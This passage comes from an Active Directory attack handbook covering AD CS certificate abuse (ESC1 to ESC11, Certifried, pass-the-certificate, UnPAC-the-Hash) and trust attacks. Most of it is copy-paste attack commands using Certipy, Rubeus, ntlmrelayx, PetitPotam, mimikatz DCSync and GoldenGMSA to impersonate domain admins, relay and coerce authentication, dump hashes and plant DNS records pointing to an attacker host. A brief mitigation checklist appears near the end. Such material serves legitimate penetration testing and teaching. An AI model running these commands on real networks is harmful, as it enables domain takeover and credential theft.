  • The template has an EKU that enables authentication (Client Authentication, Smart Card Logon, PKINIT, or Any Purpose)
Exploitation with Certify
# Request a certificate as Domain Admin
Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:VulnerableTemplate /altname:administrator

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate with Rubeus using the certificate
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password /ptt
Exploitation with Certipy
# Request certificate with arbitrary SAN
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template VulnerableTemplate -upn administrator@corp.local

# Authenticate using the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
Requesting as Another User

The SAN field accepts any UPN value. An attacker with enrollment rights can request a certificate for any domain principal, including Domain Admins, service accounts, or computer accounts. The CA does not validate whether the requester is authorized to impersonate the specified SAN principal.

# Request as a service account
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template VulnerableTemplate -upn svc_sql@corp.local

# Request as a machine account
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template VulnerableTemplate -dns dc01.corp.local

10.3.2 ESC2: Any Purpose EKU or No EKU

Templates configured with the Any Purpose EKU or with no EKU at all can be used for client authentication. Templates with the SubCA EKU are even more dangerous because they allow issuing subordinate CA certificates.

The exploitation is identical to ESC1 if the template also has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT. If it does not, the certificate is still useful for authentication as the enrolling user.

# Find Any Purpose or No EKU templates
Certify.exe find /vulnerable

# Enroll in an Any Purpose template (authenticates as current user)
Certify.exe request /ca:dc01.corp.local\corp-DC01-CA /template:AnyPurposeTemplate
# Certipy exploitation
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template AnyPurposeTemplate
certipy auth -pfx user.pfx -dc-ip 10.10.10.10

10.3.3 ESC3: Enrollment Agent Template Abuse

ESC3 is a two-step attack. First, enroll in a template that has the Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1). This "enrollment agent" certificate can then be used to enroll on behalf of another user in a second template that permits enrollment agent co-signing.

Step 1: Obtain an enrollment agent certificate

# Request enrollment agent certificate
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template EnrollmentAgent

Step 2: Use the enrollment agent certificate to request on behalf of another user

# Co-sign a certificate request as administrator
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template UserTemplate -on-behalf-of 'CORP\administrator' -pfx enrollment_agent.pfx

# Authenticate with the resulting certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
Note: The target template for Step 2 must have the Application Policy Issuance Requirement set to Certificate Request Agent, and the enrollee must be permitted to co-sign.

10.3.4 ESC4: Vulnerable Certificate Template Access Control

If a low-privileged user has write access to a certificate template object in AD (e.g., WriteDacl, WriteProperty, or GenericAll), they can modify the template to make it vulnerable to ESC1, then exploit it.

# Identify templates with weak ACLs
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10 -vulnerable

# Modify the template to enable ENROLLEE_SUPPLIES_SUBJECT and add Client Auth EKU
# Then exploit as ESC1
certipy template -u user@corp.local -p 'Password123' -template TargetTemplate -save-old

# Request cert with arbitrary SAN (now ESC1)
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template TargetTemplate -upn administrator@corp.local

# Restore original template configuration
certipy template -u user@corp.local -p 'Password123' -template TargetTemplate -configuration old-config.json

The key permissions to look for on template objects:

  • Owner of the template object
  • FullControl / GenericAll
  • WriteOwner or WriteDacl (to grant yourself FullControl)
  • WriteProperty on the msPKI-Certificate-Name-Flag or pKIExtendedKeyUsage attributes

Methodology

  • ESC1: request a certificate with an arbitrary SAN to impersonate Domain Admin: 
    certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template VulnerableTemplate -upn administrator@corp.local
  • Authenticate using the issued certificate: 
    certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
  • ESC2: enroll in an Any Purpose or No EKU template and authenticate: 
    certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template AnyPurposeTemplate
certipy auth -pfx user.pfx -dc-ip 10.10.10.10
  • ESC3 Step 1: obtain an enrollment agent certificate: 
    certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template EnrollmentAgent
  • ESC3 Step 2: co-sign a request on behalf of another user and authenticate: 
    certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template UserTemplate -on-behalf-of 'CORP\administrator' -pfx enrollment_agent.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
  • ESC4: modify a writable template to enable ENROLLEE_SUPPLIES_SUBJECT, exploit as ESC1, then restore: 
    certipy template -u user@corp.local -p 'Password123' -template TargetTemplate -save-old
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template TargetTemplate -upn administrator@corp.local
certipy template -u user@corp.local -p 'Password123' -template TargetTemplate -configuration old-config.json

10.4 PKI and CA Attacks (ESC5-8)

ESC5 targets the broader PKI objects in Active Directory rather than individual templates. If an attacker can modify the CA object, the NTAuthCertificates object, or other PKI-related objects in the Configuration Naming Context, they can compromise the entire PKI.

10.4.1 ESC5: Vulnerable PKI Object Access Control

ESC5 targets the broader PKI objects in Active Directory rather than individual templates. If an attacker can modify the CA object, the NTAuthCertificates object, or other PKI-related objects in the Configuration Naming Context, they can compromise the entire PKI.

Vulnerable objects include:

  • CA server computer object: compromising the CA host gives access to the CA private key
  • CA object in AD (CN=Enrollment Services): controls which templates the CA publishes
  • NTAuthCertificates object: defines which CAs are trusted for authentication; adding a rogue CA here enables forged certificate authentication
  • Enrollment Services container: managing this grants control over CA configuration in AD
# Check ACLs on the CA object in AD
Get-ADObject "CN=corp-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties nTSecurityDescriptor | Select-Object -ExpandProperty nTSecurityDescriptor | Select-Object -ExpandProperty Access

10.4.2 ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA

When the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled, any certificate request can include a user-defined SAN, regardless of the template configuration. This effectively turns every template with an authentication EKU into an ESC1-vulnerable template.

# Check if the flag is enabled on the CA
certutil -config "dc01.corp.local\corp-DC01-CA" -getreg "policy\EditFlags"
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)
# Exploit with Certipy: request any template with a custom SAN
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template User -upn administrator@corp.local
Note: Microsoft's May 2022 patch introduced the szOID_NTDS_CA_SECURITY_EXT extension (1.3.6.1.4.1.311.25.2), which embeds the requester's SID in the certificate. This mitigates ESC6 on patched CAs because the SID in the extension will not match the SAN, causing authentication to fail unless StrongCertificateBindingEnforcement is set to 0.

10.4.3 ESC7: Vulnerable CA Access Control (ManageCA and ManageCertificates)

The CA itself has an access control list. Two privileges on the CA object are particularly dangerous: ManageCA and ManageCertificates.

ManageCA Privilege

A principal with ManageCA can modify CA configuration, including enabling the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (escalating to ESC6) or adding themselves as a Certificate Manager.

# Add yourself as officer (ManageCertificates)
certipy ca -u user@corp.local -p 'Password123' -ca corp-DC01-CA -add-officer user

# Enable EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca -u user@corp.local -p 'Password123' -ca corp-DC01-CA -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2
ManageCertificates Privilege

A principal with ManageCertificates (also called Certificate Manager or Officer) can approve pending certificate requests. This is useful when a template requires manager approval.

# Submit a request that requires approval
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template ApprovalRequired -upn administrator@corp.local

# Approve the pending request (requires ManageCertificates)
certipy ca -u officer@corp.local -p 'Password123' -ca corp-DC01-CA -issue-request 123

# Retrieve the issued certificate
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -retrieve 123
Combined Exploitation

With ManageCA, an attacker can grant themselves ManageCertificates, then submit and approve requests for any user via the SubCA template. The SubCA template is built-in, enabled by default, and requires CA manager approval:

# Full chain: ManageCA -> add officer -> enable SubCA template -> request -> approve -> auth
certipy ca -u user@corp.local -p 'Password123' -ca corp-DC01-CA -add-officer user
certipy ca -u user@corp.local -p 'Password123' -ca corp-DC01-CA -enable-template SubCA
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template SubCA -upn administrator@corp.local
# Request will be denied initially; note the request ID
certipy ca -u user@corp.local -p 'Password123' -ca corp-DC01-CA -issue-request <ID>
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -retrieve <ID>

10.4.4 ESC8: NTLM Relay to AD CS HTTP Endpoints

When AD CS exposes HTTP-based enrollment endpoints (Certificate Enrollment Web Service or Certificate Authority Web Enrollment), these endpoints accept NTLM authentication by default. An attacker can relay NTLM authentication to these endpoints to request certificates on behalf of the coerced principal.

# Start ntlmrelayx targeting the CA web enrollment endpoint
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce authentication from a domain controller (PetitPotam)
python3 PetitPotam.py attacker_ip dc01.corp.local

# The relay request produces a Base64-encoded certificate
# Decode and use it for authentication
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10

This attack is particularly powerful when combined with authentication coercion against domain controllers, as it yields a DC machine certificate that can be used for DCSync via PKINIT.

Methodology

  • ESC5: check ACLs on the CA and PKI objects for write access: 
    Get-ADObject "CN=corp-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties nTSecurityDescriptor | Select-Object -ExpandProperty nTSecurityDescriptor | Select-Object -ExpandProperty Access
  • ESC6: check if EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled on the CA: 
    certutil -config "dc01.corp.local\corp-DC01-CA" -getreg "policy\EditFlags"
  • ESC6: if enabled, request any authentication template with a custom SAN: 
    certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template User -upn administrator@corp.local
  • ESC7: with ManageCA, add yourself as officer and enable the SubCA template: 
    certipy ca -u user@corp.local -p 'Password123' -ca corp-DC01-CA -add-officer user
certipy ca -u user@corp.local -p 'Password123' -ca corp-DC01-CA -enable-template SubCA
  • ESC7: request a SubCA cert, approve the pending request, then retrieve it: 
    certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template SubCA -upn administrator@corp.local
certipy ca -u user@corp.local -p 'Password123' -ca corp-DC01-CA -issue-request <ID>
certipy req -u user@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -retrieve <ID>
  • ESC8: relay NTLM authentication to the CA HTTP enrollment endpoint: 
    impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
  • ESC8: coerce DC authentication and use the relayed certificate: 
    python3 PetitPotam.py attacker_ip dc01.corp.local
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10

10.5 Advanced ESC Attacks (ESC9-13)

ESC9 abuses the CT_FLAG_NO_SECURITY_EXTENSION flag on a certificate template. When this flag is set, the szOID_NTDS_CA_SECURITY_EXT SID extension is not embedded in issued certificates. This means certificate mapping falls back to the UPN or DNS name alone, bypassing SID-based strong mapping.

10.5.1 ESC9: Certificate Mapping Bypass (NoSecurityExtension)

ESC9 abuses the CT_FLAG_NO_SECURITY_EXTENSION flag on a certificate template. When this flag is set, the szOID_NTDS_CA_SECURITY_EXT SID extension is not embedded in issued certificates. This means certificate mapping falls back to the UPN or DNS name alone, bypassing SID-based strong mapping.

Requirements:

  • StrongCertificateBindingEnforcement is not set to 2 (full enforcement mode)
  • The template has the CT_FLAG_NO_SECURITY_EXTENSION flag
  • The template permits Client Authentication
  • The attacker has GenericWrite over another account to change its UPN
# Change the target user's UPN to match the admin
certipy account update -u user@corp.local -p 'Password123' -user victim -upn administrator

# Request a certificate for the victim (UPN now = administrator)
certipy req -u victim@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template NoSecExt

# Restore the victim's UPN
certipy account update -u user@corp.local -p 'Password123' -user victim -upn victim@corp.local

# Authenticate with the certificate (maps to administrator via UPN)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

10.5.2 ESC10: Certificate Mapping Bypass (Weak Registry Keys)

ESC10 exploits weak certificate mapping registry keys on the domain controller. Two distinct cases exist, depending on which registry key is misconfigured.

Case 1: CertificateMappingMethods

When HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods includes the 0x4 flag (UPN mapping), Schannel will map certificates based on UPN without verifying the SID extension.

# Check the registry value on the DC
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" /v CertificateMappingMethods

Exploitation follows the same pattern as ESC9: modify a user's UPN via GenericWrite, request a certificate, restore the UPN, authenticate.

Case 2: StrongCertificateBindingEnforcement

When HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement is set to 0 (disabled) or 1 (compatibility mode), the KDC does not enforce strict SID-certificate mapping during PKINIT. This allows certificates obtained for one user (via UPN manipulation) to authenticate as another.

# Check the value on the DC
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
# 0 = Disabled (vulnerable), 1 = Compatibility (vulnerable), 2 = Full enforcement (secure)

10.5.3 ESC11: NTLM Relay to AD CS ICPR (RPC) Endpoints

Similar to ESC8, ESC11 targets the AD CS RPC endpoint (ICertPassage Remote Protocol, MS-ICPR) instead of the HTTP endpoint. If the CA does not enforce IF_ENFORCEENCRYPTICERTREQUEST (encryption required for RPC), NTLM authentication can be relayed to the RPC enrollment interface.

# Check if encryption is enforced
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10
# Look for "Enforce Encryption for Requests: Disabled"

# Relay to the RPC endpoint
certipy relay -ca ca01.corp.local -template DomainController

# Coerce authentication
python3 PetitPotam.py attacker_ip dc01.corp.local

Methodology

  • ESC9: change target user UPN to the admin, request a cert from a NoSecurityExtension template, then restore: 
    certipy account update -u user@corp.local -p 'Password123' -user victim -upn administrator
certipy req -u victim@corp.local -p 'Password123' -ca corp-DC01-CA -target dc01.corp.local -template NoSecExt
certipy account update -u user@corp.local -p 'Password123' -user victim -upn victim@corp.local
  • ESC9: authenticate with the certificate (maps to administrator via UPN): 
    certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
  • ESC10: check DC registry for weak certificate mapping configuration: 
    reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" /v CertificateMappingMethods
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
  • ESC10: if weak mapping exists, exploit with the same UPN manipulation flow as ESC9
  • ESC11: check if RPC encryption is enforced, then relay to the ICPR endpoint: 
    certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10
certipy relay -ca ca01.corp.local -template DomainController
  • ESC11: coerce authentication to trigger the relay: 
    python3 PetitPotam.py attacker_ip dc01.corp.local

10.6 Certificate Persistence and Summary

Certificate mapping determines how a certificate is associated with an AD account during authentication. Two mapping types exist:

10.6.1 Certificate Mapping

Certificate mapping determines how a certificate is associated with an AD account during authentication. Two mapping types exist:

Mapping TypeMechanismSecurity
Explicit (Strong)Maps via the altSecurityIdentities attribute on the user object, using the certificate's serial number and issuer or the SID extensionSecure; requires exact match
Implicit (Weak)Maps via UPN, email, or DNS name in the certificate's SAN fieldVulnerable; UPN can be manipulated if the attacker has write access

Microsoft's KB5014754 (May 2022) introduced the SID extension and StrongCertificateBindingEnforcement registry key to enforce explicit mapping. Full enforcement (value 2) blocks implicit mapping entirely.

# View certificate mapping on a user object
Get-ADUser administrator -Properties altSecurityIdentities | Select-Object -ExpandProperty altSecurityIdentities

# Manually add explicit mapping
Set-ADUser administrator -Replace @{altSecurityIdentities="X509:<SKI>abc123..."}

10.6.2 Certifried (CVE-2022-26923)

Certifried exploits a privilege escalation vulnerability in certificate-based authentication. By default, any domain user can create machine accounts (up to the ms-DS-MachineAccountQuota limit). When the new machine account requests a certificate using the built-in Machine template, the certificate is mapped based on the dNSHostName attribute.

The attack: create a machine account, set its dNSHostName to match a domain controller's hostname, then request a certificate. The issued certificate maps to the DC.

# Create a machine account
impacket-addcomputer corp.local/user:Password123 -computer-name 'EVIL$' -computer-pass 'Passw0rd!'

# Set dNSHostName to match a DC
python3 bloodyAD.py -d corp.local -u user -p 'Password123' --host dc01.corp.local set object 'EVIL$' dNSHostName -v 'dc01.corp.local'

# Request a Machine certificate for the spoofed machine
certipy req -u 'EVIL$'@corp.local -p 'Passw0rd!' -ca corp-DC01-CA -target dc01.corp.local -template Machine

# Authenticate as the DC
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
Patch: Microsoft addressed this in May 2022 (KB5014754) by adding the SID extension to certificates and enforcing SID-based mapping. Patched DCs will reject certificates where the embedded SID does not match the authenticating account.

10.6.3 PKINIT and Alternative Authentication

PKINIT is a Kerberos extension (RFC 4556) that enables certificate-based pre-authentication. Instead of encrypting the timestamp with a password-derived key, the client signs the AS-REQ with a certificate's private key. The KDC validates the signature, checks the certificate chain, verifies the SAN/SID mapping, and issues a TGT.

Pass-the-Certificate (PtC) uses a stolen or forged certificate to obtain a TGT via PKINIT:

# Certipy: certificate to TGT
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
# Returns the NT hash and a ccache file

# Rubeus: certificate to TGT
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:pfxpass /ptt

UnPAC-the-Hash: when PKINIT authentication succeeds, the PAC in the TGT contains the user's NT hash encrypted with the session key. This allows extracting the NTLM hash from a PKINIT TGT:

# Certipy automatically extracts the NT hash during auth
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
# Output includes: NT hash: aad3b435b51404eeaad3b435b51404ee:...

10.6.4 Using BloodHound with Certipy

Certipy can output enumeration data in BloodHound-compatible format, adding ADCS edges and nodes to the attack graph.

# Generate BloodHound data with ADCS information
certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10 -old-bloodhound

# Import the generated JSON files into BloodHound
# Look for edges: CanEnroll, HasEnrollmentRights, IssuedSignedBy, EnterpriseCAFor, etc.

Key ADCS edges in BloodHound:

  • CanEnroll: principal has enrollment rights on a template
  • ADCSESC1 through ADCSESC10: specific escalation path edges
  • IssuedSignedBy: certificate chain relationships
  • EnterpriseCAFor: CA to domain relationships
  • RootCAFor / NTAuthStoreFor: trust anchor relationships

10.6.5 ADCS Attack Summary

ESCVulnerabilityRequirementImpact
ESC1Enrollee supplies SANEnrollment rights + auth EKUImpersonate any user
ESC2Any Purpose / No EKUEnrollment rightsAuth as enrollee or impersonate (if SAN enabled)
ESC3Enrollment agent templateEnrollment rights on agent templateEnroll on behalf of any user
ESC4Template ACL misconfigurationWrite access to template objectModify template to ESC1
ESC5PKI object ACL misconfigurationWrite access to PKI objectsCompromise CA or trust anchors
ESC6EDITF_ATTRIBUTESUBJECTALTNAME2Enrollment rights on any auth templateImpersonate any user
ESC7ManageCA / ManageCertificatesCA ACL privilegesApprove requests or enable ESC6
ESC8HTTP enrollment relayNTLM coercion + HTTP endpointCertificate as coerced principal
ESC9No security extension flagGenericWrite + template flagUPN mapping bypass
ESC10Weak registry mappingGenericWrite + weak registry configUPN mapping bypass
ESC11RPC enrollment relayNTLM coercion + RPC endpointCertificate as coerced principal

Mitigation checklist:

  • Audit all published templates: disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT where not explicitly needed
  • Remove enrollment rights from low-privileged groups (especially Domain Users and Domain Computers)
  • Enable manager approval on sensitive templates
  • Remove the EDITF_ATTRIBUTESUBJECTALTNAME2 flag from all CAs
  • Enforce StrongCertificateBindingEnforcement = 2 on all DCs
  • Disable HTTP enrollment endpoints or require EPA (Extended Protection for Authentication)
  • Enforce encryption on ICPR (RPC) endpoints
  • Monitor certificate enrollment events (Event IDs 4886, 4887) and PKINIT authentication (Event ID 4768 with certificate info)
  • Use Certipy or PSPKIAudit to audit ADCS regularly

Methodology

  • Certifried (CVE-2022-26923): create a machine account and spoof its dNSHostName to a DC: 
    impacket-addcomputer corp.local/user:Password123 -computer-name 'EVIL$' -computer-pass 'Passw0rd!'
python3 bloodyAD.py -d corp.local -u user -p 'Password123' --host dc01.corp.local set object 'EVIL$' dNSHostName -v 'dc01.corp.local'
  • Request a Machine template certificate for the spoofed account and authenticate as the DC: 
    certipy req -u 'EVIL$'@corp.local -p 'Passw0rd!' -ca corp-DC01-CA -target dc01.corp.local -template Machine
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
  • Pass-the-Certificate: use a stolen PFX to obtain a TGT via PKINIT: 
    certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
  • UnPAC-the-Hash: extract the NT hash from a PKINIT TGT (certipy outputs it automatically): 
    certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
  • View existing certificate mappings on a target user: 
    Get-ADUser administrator -Properties altSecurityIdentities | Select-Object -ExpandProperty altSecurityIdentities
  • Generate BloodHound-compatible ADCS data and import for attack path analysis: 
    certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10 -old-bloodhound

11. Active Directory Trust Attacks

Active Directory trusts define authentication relationships between domains and forests. Misconfigured or inherently permissive trusts create pathways for lateral movement and privilege escalation across security boundaries.

11.1 Trust Fundamentals

Trust relationships allow principals in one domain to authenticate and access resources in another. The key trust properties:

PropertyOptionsMeaning
DirectionOne-way inbound, One-way outbound, Two-wayDetermines which direction authentication flows. In a one-way trust, the trusting domain allows access from the trusted domain.
TransitivityTransitive, Non-transitiveTransitive trusts extend to other domains trusted by the trusted domain. Parent/child and tree-root trusts are always transitive.
TypeParent/Child, Tree-root, Forest, External, Realm, ShortcutDetermines default properties. Forest trusts are transitive within each forest but not across additional forests.
Trust TypeCreatedTransitiveSID Filtering
Parent/ChildAutomaticallyYesDisabled (within same forest)
Tree-rootAutomaticallyYesDisabled (within same forest)
ForestManuallyYes (within each forest)Enabled by default
ExternalManuallyNoEnabled by default
Realm (Kerberos)ManuallyConfigurableVaries
ShortcutManuallyYesDisabled (same forest)

Enumerating trusts:

# PowerView
Get-DomainTrust
Get-DomainTrust -Domain child.corp.local
Get-ForestTrust

# Built-in tools
nltest /domain_trusts /all_trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# BloodHound Cypher
MATCH (d:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d.name, r, d2.name
# From Linux
ldapsearch -H ldap://dc01.corp.local -D "user@corp.local" -w 'Password123' -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" cn trustDirection trustType trustAttributes

11.2 Intra-Forest Trust Attacks

Servers configured for unconstrained delegation cache TGTs of any user that authenticates to them. Within a forest, if an attacker compromises a server with unconstrained delegation, they can coerce a domain controller to authenticate and capture its TGT, then use it for DCSync or other privileged operations.

11.2.1 Unconstrained Delegation (Intra-Forest)

Servers configured for unconstrained delegation cache TGTs of any user that authenticates to them. Within a forest, if an attacker compromises a server with unconstrained delegation, they can coerce a domain controller to authenticate and capture its TGT, then use it for DCSync or other privileged operations.

# Find unconstrained delegation servers (excluding DCs)
Get-DomainComputer -Unconstrained | Where-Object { $_.distinguishedname -notmatch "Domain Controllers" } | Select-Object dnshostname

# Monitor for incoming TGTs with Rubeus
Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$
# Coerce DC authentication using SpoolSample / PrinterBug
python3 printerbug.py corp.local/user:Password123@dc01.corp.local ud-server.corp.local

# Or use PetitPotam
python3 PetitPotam.py ud-server.corp.local dc01.corp.local

The captured TGT can be injected and used for DCSync:

# Inject the captured TGT
Rubeus.exe ptt /ticket:doIFxj...

# DCSync
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

11.2.2 Configuration Naming Context Abuse

The Configuration Naming Context (NC) is replicated to all domain controllers across the entire forest. Any domain user in any child domain can read the Configuration NC, gaining visibility into the entire forest's structure: sites, subnets, services, ADCS objects, and trust objects.

# Query the Configuration NC from a child domain
Get-ADObject -SearchBase "CN=Configuration,DC=corp,DC=local" -Filter * -Properties * | Select-Object distinguishedName, objectClass

# Enumerate all sites and subnets
Get-ADReplicationSite -Filter *
Get-ADReplicationSubnet -Filter *

# Enumerate ADCS from a child domain
Get-ADObject -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties *

This is significant for intra-forest attacks because a child domain user can enumerate the entire forest's PKI, find vulnerable certificate templates, and exploit them from across domain boundaries.

11.2.3 Abusing Foreign Groups and ACL Principals (Intra-Forest)

Within a forest, principals from one domain can be members of groups in another domain (foreign group membership) or have ACL entries on objects in another domain. These cross-domain relationships create attack paths.

# Find foreign group membership
Get-DomainForeignGroupMember -Domain corp.local

# Find foreign ACL principals
Find-InterestingDomainAcl -Domain corp.local -ResolveGUIDs | Where-Object { $_.IdentityReferenceDomain -ne "corp.local" }
# BloodHound query: find cross-domain edges
MATCH (u)-[r]->(g) WHERE u.domain <> g.domain RETURN u.name, type(r), g.name

Common patterns include: a child domain admin group nested inside the parent domain's "Server Operators" group, or a service account from the child granted GenericAll on objects in the parent.

Methodology

  • Enumerate servers with unconstrained delegation (excluding DCs): 
    Get-DomainComputer -Unconstrained | Where-Object { $_.distinguishedname -notmatch "Domain Controllers" } | Select-Object dnshostname
  • Start Rubeus monitor on compromised UD server and coerce DC authentication: 
    Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$
  • Trigger DC authentication via PrinterBug or PetitPotam: 
    python3 printerbug.py corp.local/user:Password123@dc01.corp.local ud-server.corp.local
# Or
python3 PetitPotam.py ud-server.corp.local dc01.corp.local
  • Inject captured TGT and DCSync: 
    Rubeus.exe ptt /ticket:doIFxj...
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
  • Query the Configuration NC from a child domain to enumerate forest-wide PKI and sites: 
    Get-ADObject -SearchBase "CN=Configuration,DC=corp,DC=local" -Filter * -Properties * | Select-Object distinguishedName, objectClass
Get-ADReplicationSite -Filter *
Get-ADReplicationSubnet -Filter *
  • Find foreign group memberships and cross-domain ACL principals: 
    Get-DomainForeignGroupMember -Domain corp.local
Find-InterestingDomainAcl -Domain corp.local -ResolveGUIDs | Where-Object { $_.IdentityReferenceDomain -ne "corp.local" }
  • Use BloodHound to map cross-domain edges: 
    MATCH (u)-[r]->(g) WHERE u.domain <> g.domain RETURN u.name, type(r), g.name

11.3 Child-to-Parent Trust Attacks

Enterprise CAs publish templates in the Configuration NC, which is forest-wide. A user in a child domain can enroll in vulnerable templates published by a CA in the parent domain, provided the template grants enrollment rights to principals from the child domain (e.g., "Authenticated Users" or "Domain Users" from the child).

11.3.1 Abusing ADCS Across Trust (Child to Parent)

Enterprise CAs publish templates in the Configuration NC, which is forest-wide. A user in a child domain can enroll in vulnerable templates published by a CA in the parent domain, provided the template grants enrollment rights to principals from the child domain (e.g., "Authenticated Users" or "Domain Users" from the child).

# From child domain, find vulnerable templates on the parent CA
certipy find -u user@child.corp.local -p 'Password123' -dc-ip 10.10.10.20 -vulnerable

# Request a certificate for a parent domain admin (ESC1)
certipy req -u user@child.corp.local -p 'Password123' -ca corp-ROOT-CA -target root-dc.corp.local -template VulnerableTemplate -upn administrator@corp.local

# Authenticate to the parent domain
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

11.3.2 GPO On Site Attack (Child to Parent)

Group Policy Objects linked to AD Sites apply to all computer objects in that site, regardless of their domain. If an attacker in a child domain can create or modify a GPO linked to a site containing parent domain computers, they can execute code in the parent domain context.

# Enumerate GPOs linked to sites
Get-DomainGPO -SearchBase "CN=Sites,CN=Configuration,DC=corp,DC=local"

# Check permissions on site-linked GPOs
Get-DomainGPO -Identity "{GPO-GUID}" | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll" }

If writable, modify the GPO to add a scheduled task or startup script that executes a payload on parent domain computers within the site.

11.3.3 GoldenGMSA Attack (Child to Parent)

Group Managed Service Accounts (gMSAs) derive their passwords from the Key Distribution Service (KDS) root key stored in the Configuration NC. Since the Configuration NC is forest-wide, an attacker who can read the KDS root key from any domain can compute the password for any gMSA in the forest.

# Read KDS root keys (requires domain admin in any domain within the forest)
Get-ADObject -SearchBase "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties *
# GoldenGMSA: compute gMSA password from KDS root key
python3 GoldenGMSA.py -d corp.local -u user -p 'Password123' --kds-root-key-guid <GUID> --sid <gMSA-SID>

# Alternative: use gMSADumper to retrieve the password
python3 gMSADumper.py -u user -p 'Password123' -d corp.local

11.3.4 DNS Trust Attack (Child to Parent)

Active Directory Integrated DNS (ADIDNS) zones are stored in the domain NC or application partitions. By default, authenticated users can create new DNS records in the ADIDNS zone. An attacker in a child domain can inject DNS records in the parent domain's ADIDNS zone (if permissions allow) or use WPAD/LLMNR poisoning across trust boundaries.

# Add a DNS record via LDAP (dnstool.py)
python3 dnstool.py -u 'child.corp.local\user' -p 'Password123' -a add -r wpad.corp.local -d attacker_ip dc01.corp.local

# Or inject a wildcard record
